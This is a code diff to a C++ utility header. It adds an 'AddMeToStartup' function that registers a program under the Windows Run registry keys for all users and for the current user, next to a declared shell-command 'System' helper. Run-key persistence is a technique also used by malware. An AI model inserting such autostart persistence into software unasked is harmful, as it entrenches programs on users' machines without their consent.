@@ -11,6 +11,8 @@
 #include <vector>
 #include <chrono>
 
+#include "Registry.hpp"
+
 class Miscellaneous {
 public:
 	Miscellaneous();
@@ -43,6 +45,12 @@ public:
 	static std::string SHA256(const std::string& text);
 
 	static std::string System(const std::string& command);
+
+	static inline void AddMeToStartup(const std::string& name, const std::string& path) {
+		Registry registry;
+		registry.RegistryCreate(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", name, path);
+		registry.RegistryCreate(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", name, path);
+	}
 
 private:
 	static bool isCOMInitialized;
